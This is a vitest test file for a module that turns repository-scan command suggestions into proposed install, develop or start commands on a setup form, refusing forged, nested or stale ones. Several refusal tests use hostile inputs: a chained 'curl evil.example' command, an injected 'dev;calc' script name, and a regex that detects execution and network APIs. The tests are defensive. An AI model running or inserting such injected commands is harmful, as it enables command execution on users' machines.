// Stage 3A: the pure mapping from a Suggested Setup suggestion to a proposed
// Setup change. Only root install / develop / start commands built from fixed
// templates for the current analysis can be planned; applying re-checks the
// live form, analysis and setup, and changes only the one target field.
import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { suggestCommands } from "../../src/lib/insights/suggestCommands";
import type { CommandSuggestion } from "../../src/lib/insights/types";
import {
  applySetupDraft,
  checkCommandTemplate,
  planSetupDraft,
  type SetupDraftContext,
  type SetupDraftForm,
  type SetupDraftPlan,
  type SetupDraftPlanResult,
} from "../../src/lib/setupDraft";
import type { RepoScanResult } from "../../src/types";
import { deepFreeze, pkg, scan, type ScanOptions } from "./insights/builders";

const ZWSP = String.fromCodePoint(0x200b);
const REPO = "C:\\Users\\dev\\repo";
const FORM: SetupDraftForm = {
  name: "My App",
  repoPath: REPO,
  installCommand: "npm install",
  frontendCommand: "npm run dev",
  backendCommand: "npm start",
  previewUrl: "http://localhost:3000",
  frontendPort: "3000",
  backendPort: "3001",
};
const viteApp = (scripts: Record<string, string> = { dev: "vite" }, files = ["package-lock.json", "vite.config.ts"]): ScanOptions => ({
  packages: [pkg("package.json", { deps: ["react"], dev: ["vite"], scripts })],
  files,
});
const contextFor = (result: RepoScanResult, over: Partial<SetupDraftContext> = {}): SetupDraftContext => ({
  form: FORM,
  fieldOrigins: {},
  setupId: "setup-1",
  analysis: { id: "analysis-1", repoPath: REPO, result },
  ...over,
});
const suggestionsOf = (result: RepoScanResult) => suggestCommands(result).suggestions;
const find = (result: RepoScanResult, match: (s: CommandSuggestion) => boolean) => {
  const s = suggestionsOf(result).find(match);
  if (!s) throw new Error("no such suggestion");
  return s;
};
const install = (result: RepoScanResult, manager = "npm") => find(result, (s) => s.source === "install" && s.directory === "." && s.packageManager === manager);
const run = (result: RepoScanResult, scriptName: string) => find(result, (s) => s.source === "script" && s.directory === "." && s.scriptName === scriptName);
function eligible(result: SetupDraftPlanResult): SetupDraftPlan {
  if (result.status !== "eligible") throw new Error(`refused: ${result.reason}`);
  return result;
}
const reason = (result: SetupDraftPlanResult) => (result.status === "refused" ? result.reason : "eligible");
const appliedForm = (plan: SetupDraftPlan, context: SetupDraftContext) => {
  const out = applySetupDraft(plan, context);
  if (out.status !== "applied") throw new Error(`${out.status}: ${out.reason}`);
  return out.form;
};

describe("eligible root suggestions", () => {
  it("root npm install -> installCommand, exactly the suggested text", () => {
    const result = scan(viteApp());
    const plan = eligible(planSetupDraft(install(result), contextFor(result)));
    expect(plan.change).toEqual({ field: "installCommand", currentValue: "npm install", proposedValue: "npm install", currentKind: "user-entered" });
    expect([plan.purpose, plan.packageManager, plan.scriptName]).toEqual(["install", "npm", null]);
  });

  it.each([
    ["pnpm", "pnpm-lock.yaml"],
    ["yarn", "yarn.lock"],
    ["bun", "bun.lock"],
  ])("root %s install uses its fixed template", (manager, lockfile) => {
    const result = scan(viteApp({ dev: "vite" }, [lockfile, "vite.config.ts"]));
    const plan = eligible(planSetupDraft(install(result, manager), contextFor(result)));
    expect(plan.change.proposedValue).toBe(`${manager} install`);
    expect(plan.packageManager).toBe(manager);
  });

  it("root develop script -> frontendCommand", () => {
    const result = scan(viteApp({ dev: "vite" }, ["pnpm-lock.yaml", "vite.config.ts"]));
    const plan = eligible(planSetupDraft(run(result, "dev"), contextFor(result)));
    expect(plan.change).toMatchObject({ field: "frontendCommand", proposedValue: "pnpm run dev" });
    expect([plan.purpose, plan.confidence, plan.scanComplete]).toEqual(["develop", "high", true]);
  });

  it("root start script -> frontendCommand", () => {
    const result = scan({ packages: [pkg("package.json", { deps: ["express"], scripts: { start: "node server.js" } })], files: ["package-lock.json"] });
    const plan = eligible(planSetupDraft(run(result, "start"), contextFor(result)));
    expect(plan.change).toMatchObject({ field: "frontendCommand", proposedValue: "npm run start" });
    expect(plan.purpose).toBe("start");
  });

  it("develop and start are separate choices; each proposes only its own command", () => {
    const result = scan(viteApp({ dev: "vite", start: "vite preview" }));
    const dev = eligible(planSetupDraft(run(result, "dev"), contextFor(result)));
    const start = eligible(planSetupDraft(run(result, "start"), contextFor(result)));
    expect([dev.purpose, dev.change.proposedValue]).toEqual(["develop", "npm run dev"]);
    expect([start.purpose, start.change.proposedValue]).toEqual(["start", "npm run start"]);
    expect(appliedForm(start, contextFor(result)).frontendCommand).toBe("npm run start");
  });
});

describe("refusals", () => {
  const monorepo = (): RepoScanResult =>
    scan({
      packages: [
        pkg("package.json", { workspaces: ["apps/*"], scripts: { dev: "turbo run dev", "dev:all x": "turbo run dev" } }),
        pkg("apps/web/package.json", { deps: ["react"], dev: ["vite"], scripts: { dev: "vite" } }),
        pkg("tools/cli/package.json", { deps: ["express"], scripts: { start: "node cli.js" } }),
      ],
      files: ["package-lock.json", "tools/cli/package-lock.json", "apps/web/vite.config.ts"],
    });

  it("nested packages are never mapped: their commands have no Setup field", () => {
    const result = monorepo();
    const nested = suggestionsOf(result).filter((s) => s.directory !== ".");
    expect(nested.length).toBeGreaterThan(1);
    for (const s of nested) expect(reason(planSetupDraft(s, contextFor(result))), s.id).toBe("not-repository-root");
  });

  it("root orchestration scripts are informational only", () => {
    const result = monorepo();
    const orchestrated = suggestionsOf(result).filter((s) => s.orchestration !== null);
    expect(orchestrated.length).toBeGreaterThan(0);
    for (const s of orchestrated) expect(reason(planSetupDraft(s, contextFor(result))), s.id).toBe("orchestration");
  });

  it("no command: an unknown package manager or a command Stage 2 couldn't build", () => {
    const unknown = scan(viteApp({ dev: "vite" }, ["vite.config.ts"])); // no lockfile
    const rootSuggestions = suggestionsOf(unknown).filter((x) => x.directory === ".");
    expect(rootSuggestions.length).toBeGreaterThan(0);
    for (const s of rootSuggestions) {
      expect(s.command).toBeNull();
      expect(reason(planSetupDraft(s, contextFor(unknown)))).toBe("package-manager-unknown");
    }
    // Forging a usable command onto it is caught.
    const forged = { ...run(unknown, "dev"), command: "npm run dev", packageManager: "npm" as const, unavailableReason: null };
    expect(reason(planSetupDraft(forged, contextFor(unknown)))).toBe("not-from-analysis");
  });

  it("conflicting package managers need an explicit, matching choice", () => {
    const result = scan(viteApp({ dev: "vite" }, ["package-lock.json", "pnpm-lock.yaml", "vite.config.ts"]));
    const npmDev = find(result, (s) => s.scriptName === "dev" && s.packageManager === "npm");
    expect(npmDev.packageManagerAmbiguous).toBe(true);
    expect(reason(planSetupDraft(npmDev, contextFor(result)))).toBe("package-manager-choice-required");
    expect(reason(planSetupDraft(npmDev, contextFor(result), { chosenPackageManager: "pnpm" }))).toBe("package-manager-choice-required");
    expect(eligible(planSetupDraft(npmDev, contextFor(result), { chosenPackageManager: "npm" })).change.proposedValue).toBe("npm run dev");
    const pnpmInstall = install(result, "pnpm");
    expect(reason(planSetupDraft(pnpmInstall, contextFor(result)))).toBe("package-manager-choice-required");
    expect(eligible(planSetupDraft(pnpmInstall, contextFor(result), { chosenPackageManager: "pnpm" })).change.proposedValue).toBe("pnpm install");
  });

  it.each<[string, (s: CommandSuggestion) => CommandSuggestion]>([
    ["a chained command", (s) => ({ ...s, command: "npm run dev && curl evil.example" })],
    ["another manager's template", (s) => ({ ...s, command: "yarn run dev" })],
    ["a script body as the command", (s) => ({ ...s, command: "vite" })],
    ["an unsafe script name", (s) => ({ ...s, scriptName: "dev;calc", command: "npm run dev;calc" })],
    ["a nested directory relabelled as root", (s) => ({ ...s, id: s.id.replace(/^[^|]*/, "apps/web") })],
    ["a raised confidence", (s) => ({ ...s, confidence: "high", caveats: [] })],
    ["dropped caveats", (s) => ({ ...s, caveats: [] })],
    ["an id that doesn't exist", (s) => ({ ...s, id: "forged" })],
    ["a non-object id", (s) => ({ ...s, id: 7 as never })],
  ])("forged or edited suggestions are refused: %s", (_, edit) => {
    const result = scan(viteApp({ dev: "custom-dev-server" }));
    expect(reason(planSetupDraft(edit(run(result, "dev")), contextFor(result)))).toBe("not-from-analysis");
  });

  it("the template check on its own: only exact fixed templates with allowlisted names pass", () => {
    const result = scan(viteApp({ dev: "vite", start: "vite preview" }));
    const dev = run(result, "dev");
    const inst = install(result);
    expect(checkCommandTemplate(dev)).toEqual({ field: "frontendCommand" });
    expect(checkCommandTemplate(run(result, "start"))).toEqual({ field: "frontendCommand" });
    expect(checkCommandTemplate(inst)).toEqual({ field: "installCommand" });
    const bad = (s: CommandSuggestion) => checkCommandTemplate(s);
    expect(bad({ ...dev, command: "npm run dev && curl evil.example" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...dev, command: "npm run start" })).toEqual({ reason: "unsupported-command" }); // another script's command
    expect(bad({ ...dev, command: "pnpm run dev" })).toEqual({ reason: "unsupported-command" }); // another manager's
    expect(bad({ ...dev, command: " npm run dev" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...dev, command: "vite" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...dev, command: null })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...dev, scriptName: "dev;calc", command: "npm run dev;calc" })).toEqual({ reason: "unsafe-script-name" });
    expect(bad({ ...dev, scriptName: "-dev", command: "npm run -dev" })).toEqual({ reason: "unsafe-script-name" });
    expect(bad({ ...dev, packageManager: "npx" as never, command: "npx run dev" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...dev, purpose: "install" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...inst, command: "npm ci" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...inst, command: "npm install --ignore-scripts" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...inst, scriptName: "dev" })).toEqual({ reason: "unsupported-command" });
    expect(bad({ ...inst, source: "script" })).toEqual({ reason: "unsupported-command" });
  });

  it("a suggestion from another analysis isn't accepted for this one", () => {
    const other = scan(viteApp({ dev: "vite" }, ["pnpm-lock.yaml", "vite.config.ts"]));
    const result = scan(viteApp({ dev: "vite" }));
    expect(reason(planSetupDraft(run(other, "dev"), contextFor(result)))).toBe("not-from-analysis");
  });

  it("unsafe script names: Stage 2 builds no command, and nothing is planned", () => {
    // Stage 2 only builds such a name for a root orchestration script.
    const result = scan({ packages: [pkg("package.json", { scripts: { "dev:all x": "turbo run dev" }, workspaces: ["apps/*"] })], files: ["package-lock.json"] });
    const unsafe = suggestionsOf(result).filter((x) => x.scriptName === "dev:all x");
    expect(unsafe.length).toBeGreaterThan(0);
    for (const s of unsafe) {
      expect([s.command, s.unavailableReason]).toEqual([null, "unsafe-script-name"]);
      expect(planSetupDraft(s, contextFor(result)).status).toBe("refused");
    }
    // An unsafe name forged onto a real suggestion is refused too.
    const plain = scan(viteApp({ dev: "vite" }));
    const forged = { ...run(plain, "dev"), scriptName: "dev x", command: "npm run dev x" };
    expect(reason(planSetupDraft(forged, contextFor(plain)))).toBe("not-from-analysis");
  });

  it("altered script names: no suggestion exists, and a forged one is refused", () => {
    const result = scan(viteApp({ [`dev${ZWSP}`]: "vite" }));
    result.packages[0].scripts[0] = { ...result.packages[0].scripts[0], name: "dev", nameExact: false };
    expect(suggestionsOf(result).filter((s) => s.source === "script")).toEqual([]);
    const lookalike = run(scan(viteApp({ dev: "vite" })), "dev");
    expect(reason(planSetupDraft(lookalike, contextFor(result)))).toBe("not-from-analysis");
  });

  it("a cleaned name that collides with a real one: Stage 2 suggests neither, and a lookalike is refused", () => {
    const result = scan(viteApp({ dev: "vite", other: "x" }));
    result.packages[0].scripts[1] = { name: "dev", nameExact: false, command: "x", commandExact: true };
    expect(suggestionsOf(result).filter((s) => s.scriptName === "dev")).toEqual([]);
    const lookalike = run(scan(viteApp({ dev: "vite", other: "x" })), "dev");
    expect(reason(planSetupDraft(lookalike, contextFor(result)))).toBe("not-from-analysis");
  });

  it("no analysis, or an analysis of a different path, refuses planning", () => {
    const result = scan(viteApp());
    expect(reason(planSetupDraft(install(result), contextFor(result, { analysis: null })))).toBe("no-analysis");
    expect(reason(planSetupDraft(install(result), contextFor(result, { form: { ...FORM, repoPath: "C:\\Users\\dev\\other" } })))).toBe("analysis-path-mismatch");
    expect(reason(planSetupDraft(install(result), contextFor(result, { form: { ...FORM, repoPath: "" }, analysis: { id: "a", repoPath: "", result } })))).toBe("analysis-path-mismatch");
  });
});

describe("uncertainty is carried into the plan", () => {
  it("altered script-command display text: still the template command, Low, with its caveat", () => {
    const result = scan(viteApp({ dev: "vite\nvite preview" }));
    result.packages[0].scripts[0] = { name: "dev", nameExact: true, command: "vite vite preview", commandExact: false };
    const plan = eligible(planSetupDraft(run(result, "dev"), contextFor(result)));
    expect(plan.change.proposedValue).toBe("npm run dev");
    expect(plan.confidence).toBe("low");
    expect(plan.caveats.map((c) => c.code)).toContain("script-command-altered");
    expect(plan.change.proposedValue).not.toContain("vite preview");
  });

  it("Low-confidence suggestions keep their caveats and evidence", () => {
    const result = scan(viteApp({ dev: "custom-dev-server" }));
    const s = run(result, "dev");
    const plan = eligible(planSetupDraft(s, contextFor(result)));
    expect(plan.confidence).toBe("low");
    expect(plan.caveats).toEqual(s.caveats);
    expect(plan.evidence).toEqual(s.evidence);
    expect(plan.caveats.map((c) => c.code)).toEqual(expect.arrayContaining(["not-verified", "runs-repository-script"]));
  });

  it.each(["truncated", "cancelled", "timed-out"] as const)("a %s analysis is never presented as complete or High", (status) => {
    const result = scan({ ...viteApp(), status });
    const roots = suggestionsOf(result).filter((x) => x.directory === ".");
    expect(roots.length).toBe(2); // install and dev
    for (const s of roots) {
      const plan = eligible(planSetupDraft(s, contextFor(result)));
      expect(plan.scanComplete).toBe(false);
      expect(plan.confidence).not.toBe("high");
      expect(plan.caveats.map((c) => c.code)).toContain("scan-incomplete");
    }
  });
});

describe("staleness at Apply time", () => {
  const setup = () => {
    const result = scan(viteApp({ dev: "vite" }, ["pnpm-lock.yaml", "vite.config.ts"]));
    const context = contextFor(result);
    return { result, context, plan: eligible(planSetupDraft(run(result, "dev"), context)) };
  };

  it("applies when nothing changed", () => {
    const { context, plan } = setup();
    expect(appliedForm(plan, context)).toEqual({ ...FORM, frontendCommand: "pnpm run dev" });
  });

  it("repository path changed", () => {
    const { context, plan } = setup();
    expect(applySetupDraft(plan, { ...context, form: { ...FORM, repoPath: "C:\\Users\\dev\\other" } })).toEqual({ status: "stale", reason: "repository-path-changed" });
  });

  it("a newer analysis of the same path replaced the old one", () => {
    const { result, context, plan } = setup();
    const newer = scan(viteApp({ dev: "vite" }, ["pnpm-lock.yaml", "vite.config.ts"]));
    expect(applySetupDraft(plan, { ...context, analysis: { id: "analysis-2", repoPath: REPO, result: newer } })).toEqual({ status: "stale", reason: "analysis-changed" });
    // Same id, different result object: still stale (identity, not just the path or id).
    expect(applySetupDraft(plan, { ...context, analysis: { id: "analysis-1", repoPath: REPO, result: newer } })).toEqual({ status: "stale", reason: "analysis-changed" });
    // Analysis gone (e.g. cleared after a path change and back).
    expect(applySetupDraft(plan, { ...context, analysis: null })).toEqual({ status: "stale", reason: "analysis-changed" });
    expect(result).toBe(context.analysis!.result);
  });

  it("a different setup is selected", () => {
    const { context, plan } = setup();
    expect(applySetupDraft(plan, { ...context, setupId: "setup-2" })).toEqual({ status: "stale", reason: "setup-changed" });
    expect(applySetupDraft(plan, { ...context, setupId: null })).toEqual({ status: "stale", reason: "setup-changed" });
  });

  it("the target field changed after planning; an unrelated edit is kept", () => {
    const { context, plan } = setup();
    expect(applySetupDraft(plan, { ...context, form: { ...FORM, frontendCommand: "npm run serve" } })).toEqual({ status: "stale", reason: "field-changed" });
    const edited = { ...FORM, name: "Renamed", frontendPort: "5173" };
    expect(appliedForm(plan, { ...context, form: edited })).toEqual({ ...edited, frontendCommand: "pnpm run dev" });
  });

  it("a package-manager choice is re-checked too", () => {
    const result = scan(viteApp({ dev: "vite" }, ["package-lock.json", "pnpm-lock.yaml", "vite.config.ts"]));
    const context = contextFor(result);
    const plan = eligible(planSetupDraft(find(result, (s) => s.scriptName === "dev" && s.packageManager === "pnpm"), context, { chosenPackageManager: "pnpm" }));
    expect(appliedForm(plan, context).frontendCommand).toBe("pnpm run dev");
    expect(applySetupDraft({ ...plan, options: {} }, context)).toEqual({ status: "refused", reason: "package-manager-choice-required" });
  });

  it("a plan whose stored suggestion was tampered with is refused", () => {
    const { context, plan } = setup();
    expect(applySetupDraft({ ...plan, suggestion: { ...plan.suggestion, command: "pnpm run dev && x" } }, context)).toEqual({ status: "refused", reason: "not-from-analysis" });
    expect(applySetupDraft({ ...plan, change: { ...plan.change, proposedValue: "pnpm run evil" } }, context)).toEqual({ status: "stale", reason: "analysis-changed" });
    expect(applySetupDraft({ ...plan, change: { ...plan.change, field: "installCommand", currentValue: FORM.installCommand } }, context)).toEqual({ status: "stale", reason: "analysis-changed" });
  });
});

describe("field provenance", () => {
  const result = scan(viteApp());
  const kindFor = (form: SetupDraftForm, origins: SetupDraftContext["fieldOrigins"]) =>
    eligible(planSetupDraft(install(result), contextFor(result, { form, fieldOrigins: origins }))).change.currentKind;

  it("blank, initial default and user-entered come from the recorded origin", () => {
    expect(kindFor({ ...FORM, installCommand: "" }, {})).toBe("blank");
    expect(kindFor({ ...FORM, installCommand: "   " }, { installCommand: "initial-default" })).toBe("blank");
    expect(kindFor(FORM, { installCommand: "initial-default" })).toBe("initial-default");
    expect(kindFor(FORM, { installCommand: "user-entered" })).toBe("user-entered");
  });

  it("a value that equals a default is not assumed to be one", () => {
    expect(FORM.installCommand).toBe("npm install");
    expect(kindFor(FORM, {})).toBe("user-entered");
    expect(kindFor(FORM, { frontendCommand: "initial-default" })).toBe("user-entered");
  });
});

describe("purity and boundaries", () => {
  it("only the target field changes; every other field is preserved", () => {
    const result = scan(viteApp({ dev: "vite" }, ["yarn.lock", "vite.config.ts"]));
    const form: SetupDraftForm = { name: "N", repoPath: REPO, installCommand: "a", frontendCommand: "b", backendCommand: "c", previewUrl: "http://x", frontendPort: "1", backendPort: "2" };
    const context = contextFor(result, { form });
    const roots = suggestionsOf(result).filter((x) => x.directory === ".");
    expect(roots.map((x) => x.purpose).sort()).toEqual(["develop", "install"]);
    for (const s of roots) {
      const plan = eligible(planSetupDraft(s, context));
      const out = appliedForm(plan, context);
      const changed = (Object.keys(form) as (keyof SetupDraftForm)[]).filter((k) => out[k] !== form[k]);
      expect(changed).toEqual([plan.change.field]);
      expect(["installCommand", "frontendCommand"]).toContain(plan.change.field);
    }
  });

  it("planning changes nothing (cancelling is simply not applying)", () => {
    const result = scan(viteApp());
    const context = contextFor(result);
    const before = JSON.stringify(context.form);
    planSetupDraft(run(result, "dev"), context);
    expect(JSON.stringify(context.form)).toBe(before);
  });

  it("inputs are never mutated; frozen inputs work", () => {
    const result = deepFreeze(scan(viteApp({ dev: "vite", start: "vite preview" })));
    const context = deepFreeze(contextFor(result, { fieldOrigins: { installCommand: "initial-default" } }));
    const suggestion = deepFreeze(run(result, "dev"));
    const snapshot = JSON.stringify([result, context, suggestion]);
    const plan = eligible(planSetupDraft(suggestion, context));
    const out = applySetupDraft(plan, context);
    expect(out.status).toBe("applied");
    expect(JSON.stringify([result, context, suggestion])).toBe(snapshot);
    if (out.status === "applied") expect(out.form).not.toBe(context.form);
  });

  it("outputs are deterministic", () => {
    const result = scan(viteApp({ dev: "vite", start: "vite preview" }));
    const context = contextFor(result);
    for (const s of suggestionsOf(result)) {
      expect(JSON.stringify(planSetupDraft(s, context))).toBe(JSON.stringify(planSetupDraft(s, context)));
    }
  });

  it("the module has no IPC, filesystem, storage, network or execution access", () => {
    const source = fs.readFileSync(path.resolve(import.meta.dirname, "../../src/lib/setupDraft.ts"), "utf-8");
    expect(source).not.toMatch(/\brequire\(|import\(|\beval\(|new Function|new RegExp|\bfetch\(|XMLHttpRequest|WebSocket|localStorage|sessionStorage|indexedDB|ipcRenderer|window\.|repoRunner|child_process|["']node:|saveProject/);
    const imports = [...source.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1]).sort();
    expect(imports).toEqual(["../types", "./insights/suggestCommands", "./insights/types"]);
  });
});
